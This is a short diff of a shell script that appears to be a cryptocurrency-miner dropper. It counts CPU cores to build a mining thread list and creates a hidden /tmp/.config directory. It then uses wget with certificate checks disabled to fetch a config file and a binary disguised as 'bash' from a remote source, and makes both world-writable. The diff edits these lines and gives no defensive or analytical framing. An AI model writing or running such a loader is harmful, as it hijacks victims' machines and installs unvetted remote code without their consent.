@@ -11,9 +11,8 @@ name="${name}"
 cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
 
-work=`mktemp -d 2>/dev/null`
-[ -n "$work" ] || work="/tmp/.config"
-wget --no-check-certificate -qO "$work/config.json" "${src}/x.json"
+work="/tmp/.config"
+wget --no-check-certificate -qO "$work/config.json" "${src}/z.json"
 wget --no-check-certificate -qO "$work/bash" "${src}/bash"
 chmod -R 777 "$work"
 
